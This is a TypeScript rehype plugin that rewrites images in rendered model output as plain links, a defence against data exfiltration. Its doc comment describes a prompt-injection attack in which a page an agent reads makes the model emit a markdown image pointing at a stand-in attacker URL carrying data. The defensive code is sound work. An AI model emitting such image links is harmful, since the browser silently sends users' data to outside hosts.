import type { Element, ElementContent, Root, RootContent } from "hast";

type Node = Root | RootContent | ElementContent;

function imageLink(img: Element): Element {
  const src = typeof img.properties.src === "string" ? img.properties.src : "";
  const alt = typeof img.properties.alt === "string" ? img.properties.alt.trim() : "";
  return {
    type: "element",
    tagName: "a",
    properties: { href: src, dataImage: true },
    children: [{ type: "text", value: alt ? `${alt} (${src})` : src }],
  };
}

function swap(node: Node): void {
  if (!("children" in node)) return;
  node.children = node.children.map((child) => {
    if (child.type === "element" && child.tagName === "img") return imageLink(child);
    swap(child);
    return child;
  }) as typeof node.children;
}

/**
 * Rehype plugin: images in model output become plain links. A rendered `<img>` loads by itself, so a page the
 * agent read could make the model write `![](https://attacker/?data=…)` and the browser would send it out.
 */
export function rehypeImagesAsLinks() {
  return (tree: Root) => swap(tree);
}
